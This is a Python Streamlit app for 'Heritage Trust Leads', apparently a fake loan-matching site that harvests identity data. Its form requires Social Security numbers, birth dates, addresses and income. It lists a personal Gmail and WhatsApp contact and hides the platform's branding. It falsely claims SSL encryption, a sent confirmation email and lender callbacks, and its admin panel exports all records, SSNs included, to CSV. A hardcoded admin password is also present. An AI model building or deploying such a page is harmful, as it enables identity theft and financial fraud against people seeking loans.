import streamlit as st
import pandas as pd
import datetime
import hashlib
import uuid
import re
from datetime import datetime, timedelta

# ============================================
# PAGE CONFIG
# ============================================
st.set_page_config(
    page_title="Heritage Trust Leads | Lead Generation",
    page_icon="🇺🇸",
    layout="wide"
)

# Hide Streamlit UI
st.markdown("""
<style>
    #MainMenu {visibility: hidden;}
    header {visibility: hidden;}
    footer {visibility: hidden;}
    .stAppDeployButton {display: none;}
</style>
""", unsafe_allow_html=True)

# ============================================
# COMPANY CONFIGURATION
# ============================================
COMPANY_NAME = "Heritage Trust Leads"
COMPANY_PHONE = "(225) 244-9281"
COMPANY_WHATSAPP = "941 879 6129"
COMPANY_EMAIL = "turnerjack779@gmail.com"

# US States
US_STATES = [
    "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware",
    "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky",
    "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi",
    "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico",
    "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania",
    "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont",
    "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"
]

LOAN_TYPES = [
    "🏦 Personal Loan",
    "💼 Business Loan",
    "🎓 Student Loan",
    "🚗 Auto Loan",
    "🏠 Mortgage/Home Loan",
    "💳 Credit Card",
    "📉 Debt Consolidation"
]

# ============================================
# DATABASE
# ============================================
if 'leads' not in st.session_state:
    st.session_state.leads = []

if 'users' not in st.session_state:
    st.session_state.users = {
        "admin@heritagetrust.com": {
            "password": hashlib.sha256("Admin@2026".encode()).hexdigest(),
            "user_type": "admin",
            "name": "Admin"
        }
    }

if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
    st.session_state.user_data = None

# ============================================
# VALIDATION FUNCTIONS
# ============================================
def hash_password(pwd):
    return hashlib.sha256(pwd.encode()).hexdigest()

def validate_ssn(ssn):
    return re.match(r'^\d{3}-\d{2}-\d{4}$', ssn) is not None

def validate_phone(phone):
    phone_clean = re.sub(r'[^\d]', '', phone)
    return len(phone_clean) == 10

def validate_zip(zip_code):
    return re.match(r'^\d{5}$', zip_code) is not None

# ============================================
# LEAD CAPTURE
# ============================================
def capture_lead(data):
    lead = {
        'id': len(st.session_state.leads) + 1,
        'lead_id': str(uuid.uuid4())[:8],
        'name': data['name'],
        'email': data['email'],
        'phone': data['phone'],
        'ssn': data['ssn'],
        'dob': data['dob'],
        'address': data['address'],
        'city': data['city'],
        'state': data['state'],
        'zip': data['zip'],
        'loan_type': data['loan_type'],
        'amount': data['amount'],
        'employment': data['employment'],
        'income': data['income'],
        'consent': data['consent'],
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'status': 'New',
        'assigned_to': 'Unassigned'
    }
    st.session_state.leads.insert(0, lead)
    return lead

# ============================================
# PUBLIC LEAD FORM
# ============================================
def show_lead_form():
    st.markdown(f"""
    <div style="background: linear-gradient(135deg, #0a2f44 0%, #1e4a6e 100%); padding: 2rem; border-radius: 20px; text-align: center; margin-bottom: 2rem;">
        <h1 style="color: white; font-size: 2rem;">🏛️ {COMPANY_NAME}</h1>
        <p style="color: #ffc107; font-size: 1.2rem;">We Match You With Trusted Lenders</p>
        <p style="color: white;">One application. Multiple loan offers. Best rates.</p>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown(f"""
    <div style="background: #e8f4fd; padding: 1rem; border-radius: 10px; margin-bottom: 1rem;">
        <p>🔍 <b>How it works:</b></p>
        <ol>
            <li>Fill out the secure application below</li>
            <li>We match you with our network of trusted lenders</li>
            <li>Compare offers and choose the best rate</li>
            <li>No obligation, no hidden fees</li>
        </ol>
        <p style="font-size: 0.8rem;">📞 Questions? Call us: <b>{COMPANY_PHONE}</b> | WhatsApp: <b>{COMPANY_WHATSAPP}</b></p>
    </div>
    """, unsafe_allow_html=True)
    
    with st.form("lead_form"):
        st.markdown("### 📝 Personal Information")
        
        col1, col2 = st.columns(2)
        with col1:
            name = st.text_input("Full Name *", placeholder="John Doe")
            email = st.text_input("Email Address *", placeholder="john@example.com")
            phone = st.text_input("Phone Number *", placeholder="(555) 123-4567")
            ssn = st.text_input("Social Security Number *", placeholder="XXX-XX-XXXX", help="We use this for credit check purposes only")
        with col2:
            dob = st.date_input("Date of Birth *", min_value=datetime(1920, 1, 1), max_value=datetime(2006, 1, 1))
            address = st.text_input("Street Address *", placeholder="123 Main St")
            city = st.text_input("City *", placeholder="Los Angeles")
            state = st.selectbox("State *", US_STATES)
            zip_code = st.text_input("ZIP Code *", placeholder="90210")
        
        st.markdown("---")
        st.markdown("### 💰 Loan Details")
        
        col1, col2 = st.columns(2)
        with col1:
            loan_type = st.selectbox("Loan Type *", LOAN_TYPES)
            amount = st.number_input("Loan Amount (USD) *", min_value=1000, max_value=100000, value=10000, step=1000)
        with col2:
            employment = st.selectbox("Employment Status *", ["Employed Full-Time", "Employed Part-Time", "Self-Employed", "Retired", "Unemployed"])
            income = st.number_input("Annual Income (USD) *", min_value=0, max_value=500000, value=50000, step=5000)
        
        st.markdown("---")
        st.markdown("### 📋 Consent")
        
        st.markdown("""
        <div style="background: #f8f9fa; padding: 1rem; border-radius: 8px; font-size: 0.9rem;">
            <p>By submitting this application, I authorize <b>Heritage Trust Leads</b> to share my information with our network of partner lenders to provide me with loan offers. I understand that:</p>
            <ul>
                <li>This is a lead generation service, not a lender</li>
                <li>Lenders may contact me via phone, email, or text</li>
                <li>Completing this form does not guarantee loan approval</li>
                <li>I may receive multiple offers from different lenders</li>
            </ul>
        </div>
        """, unsafe_allow_html=True)
        
        consent = st.checkbox("I agree to receive loan offers from partner lenders *")
        
        st.markdown("---")
        st.markdown(f"""
        <div style="font-size: 0.7rem; color: #666; text-align: center;">
            <p>🔒 <b>Secure Application</b> | 256-bit SSL Encryption</p>
            <p>📞 {COMPANY_PHONE} | 💬 {COMPANY_WHATSAPP} | 📧 {COMPANY_EMAIL}</p>
            <p>© 2026 {COMPANY_NAME} | Lead Generation Service</p>
        </div>
        """, unsafe_allow_html=True)
        
        submitted = st.form_submit_button("Get My Loan Offers →", use_container_width=True, type="primary")
        
        if submitted:
            errors = []
            if not name:
                errors.append("Name required")
            if not email:
                errors.append("Email required")
            if not validate_phone(phone):
                errors.append("Valid US phone number required")
            if not validate_ssn(ssn):
                errors.append("Valid SSN format (XXX-XX-XXXX) required")
            if not validate_zip(zip_code):
                errors.append("Valid ZIP code required")
            if not consent:
                errors.append("You must agree to receive loan offers")
            
            if errors:
                for err in errors:
                    st.error(f"❌ {err}")
            else:
                lead_data = {
                    'name': name, 'email': email, 'phone': phone, 'ssn': ssn, 'dob': str(dob),
                    'address': address, 'city': city, 'state': state, 'zip': zip_code,
                    'loan_type': loan_type, 'amount': amount, 'employment': employment,
                    'income': income, 'consent': consent
                }
                capture_lead(lead_data)
                st.success(f"✅ Thank you {name}! Your application has been submitted.")
                st.balloons()
                st.info(f"📞 Partner lenders will contact you within 24 hours at {phone}")
                st.markdown(f"<div style='background: #d4edda; padding: 1rem; border-radius: 8px;'>📧 A confirmation has been sent to {email}</div>", unsafe_allow_html=True)

# ============================================
# LOGIN PAGE
# ============================================
def show_login():
    st.markdown(f"""
    <div style="background: linear-gradient(135deg, #0a2f44 0%, #1e4a6e 100%); padding: 2rem; border-radius: 20px; text-align: center; margin-bottom: 2rem;">
        <h1 style="color: white;">🏛️ {COMPANY_NAME}</h1>
        <p style="color: white;">Partner Portal</p>
    </div>
    """, unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        st.markdown("### 🔐 Portal Login")
        
        with st.form("login_form"):
            email = st.text_input("Email")
            password = st.text_input("Password", type="password")
            
            if st.form_submit_button("Login", use_container_width=True):
                if email in st.session_state.users:
                    user = st.session_state.users[email]
                    if user["password"] == hash_password(password):
                        st.session_state.logged_in = True
                        st.session_state.user_data = user
                        st.success(f"✅ Welcome {user['name']}!")
                        st.rerun()
                    else:
                        st.error("Invalid password")
                else:
                    st.error("User not found")

# ============================================
# ADMIN DASHBOARD
# ============================================
def show_admin_dashboard():
    st.markdown(f"""
    <div style="background: linear-gradient(135deg, #0a2f44 0%, #1e4a6e 100%); padding: 1rem; border-radius: 15px; margin-bottom: 1rem;">
        <h2 style="color: white;">👑 Admin Dashboard</h2>
        <p style="color: white;">Total Leads: {len(st.session_state.leads)}</p>
    </div>
    """, unsafe_allow_html=True)
    
    tab1, tab2 = st.tabs(["📊 All Leads", "📈 Stats"])
    
    with tab1:
        if st.session_state.leads:
            df = pd.DataFrame(st.session_state.leads)
            st.dataframe(df[['name', 'email', 'phone', 'city', 'state', 'loan_type', 'amount', 'income', 'timestamp']], 
                        use_container_width=True, hide_index=True)
            
            if st.button("📥 Export to CSV"):
                csv = df.to_csv(index=False)
                st.download_button("Download CSV", csv, "heritage_leads.csv", "text/csv")
        else:
            st.info("No leads captured yet")
    
    with tab2:
        if st.session_state.leads:
            col1, col2 = st.columns(2)
            with col1:
                st.markdown("#### Loan Type Distribution")
                loan_counts = {}
                for lead in st.session_state.leads:
                    loan_counts[lead['loan_type']] = loan_counts.get(lead['loan_type'], 0) + 1
                st.bar_chart(loan_counts)
            
            with col2:
                st.markdown("#### State Distribution")
                state_counts = {}
                for lead in st.session_state.leads:
                    state_counts[lead['state']] = state_counts.get(lead['state'], 0) + 1
                st.bar_chart(state_counts)

# ============================================
# MAIN APP
# ============================================
with st.sidebar:
    st.markdown(f"""
    <div style="text-align: center; padding: 0.5rem;">
        <h3>🏛️ {COMPANY_NAME}</h3>
        <p style="font-size: 0.8rem;">Lead Generation Service</p>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown("---")
    
    if st.session_state.logged_in:
        st.markdown(f"👑 Logged in as: **{st.session_state.user_data['name']}**")
        if st.button("🚪 Logout", use_container_width=True):
            st.session_state.logged_in = False
            st.session_state.user_data = None
            st.rerun()
    else:
        st.markdown("### 🔐 Portal Access")
        if st.button("🔑 Login to Dashboard", use_container_width=True):
            st.session_state.show_login = True
            st.rerun()

# Main content
if st.session_state.logged_in:
    show_admin_dashboard()
elif st.session_state.get('show_login', False):
    show_login()
else:
    show_lead_form()
